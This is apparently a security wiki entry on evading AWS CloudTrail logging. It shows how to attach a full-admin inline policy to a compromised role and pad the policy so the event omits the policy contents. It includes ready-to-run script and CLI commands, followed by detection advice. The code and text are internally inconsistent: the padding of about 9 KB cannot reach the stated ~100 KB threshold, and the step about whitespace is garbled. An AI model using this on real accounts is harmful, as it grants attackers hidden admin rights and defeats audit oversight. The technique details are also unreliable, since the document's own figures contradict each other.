---
title: AWS CloudTrail policy-size evasion
slug: aws-cloudtrail-policy-size-evasion
---

> **TL;DR:** When an IAM `PutRolePolicy` (or similar) request body crosses an undocumented size threshold, CloudTrail drops the `requestParameters` field, hiding the actual policy that was attached.

## What it is
CloudTrail records IAM management events with a `requestParameters` object that normally contains the full policy document the attacker submitted. Permiso showed that once the serialised request exceeds an internal cap (around 100 KB at disclosure), the field is silently truncated or replaced with an empty/omitted value while the call still succeeds. A defender reading CloudTrail only sees "someone called PutRolePolicy on role X" with no idea what permissions were granted — a useful primitive after a takeover where you want the privilege escalation step to be invisible.

## Preconditions / where it applies
- Compromised principal with `iam:PutRolePolicy`, `iam:PutUserPolicy`, `iam:PutGroupPolicy`, or `iam:CreatePolicyVersion`.
- Target role/user/group accepts inline or managed policies (IAM policy size hard limits are 2048 chars for users, 10240 for roles, 6144 for groups, 6144 for managed — but the *request* is what matters, padded with whitespace inside the JSON).
- Only CloudTrail-based detection in scope; tools that read the live policy after the fact still see it.

## Technique
1. Craft the malicious policy as normal (e.g. `"Action":"*","Resource":"*"`).
2. Pad the JSON with insignificant whitespace inside string values, comments are not legal, but redundant `Sid` blocks, long `Condition` keys, or repeated `NotAction` arrays inflate it past the threshold without exceeding IAM's own limits when the whitespace is collapsed server-side.
3. Submit via `aws iam put-role-policy` with the padded document; the call succeeds, the policy is attached, but the CloudTrail event omits `requestParameters.policyDocument`.

```bash
# Generate a padded inline policy that still parses
python3 - <<'PY' > evil.json
import json
pol = {
  "Version": "2012-10-17",
  "Statement": [
    {"Sid": "X"+("_"*9000), "Effect": "Allow", "Action": "*", "Resource": "*"}
  ]
}
print(json.dumps(pol))
PY

aws iam put-role-policy \
  --role-name target-role \
  --policy-name maint \
  --policy-document file://evil.json
```

```bash
# Defender sees this in CloudTrail — note missing policyDocument
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=PutRolePolicy \
  --max-results 1 | jq '.Events[0].CloudTrailEvent | fromjson | .requestParameters'
```

## Detection and defence
- Do not trust CloudTrail `requestParameters` as a complete record of IAM changes; correlate `PutRolePolicy` / `CreatePolicyVersion` events with a periodic `GetRolePolicy` / `GetPolicyVersion` snapshot and diff.
- Stream IAM state through AWS Config or a periodic `iam:Get*` job and alert on any inline policy mutation, regardless of CloudTrail content.
- Restrict `iam:PutRolePolicy` and friends to a tiny set of break-glass principals guarded by SCP.
- Related: [[aws-iam-enum]], [[aws-organisations-abuse]].

## References
- [Permiso — CloudTrail logging evasion: where policy size matters](https://permiso.io/blog/cloudtrail-logging-evasion-where-policy-size-matters) — original write-up of the size threshold and reproduction steps.
- [AWS IAM policy character limits](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_iam-quotas.html) — confirms the per-entity limits relevant to padding budget.
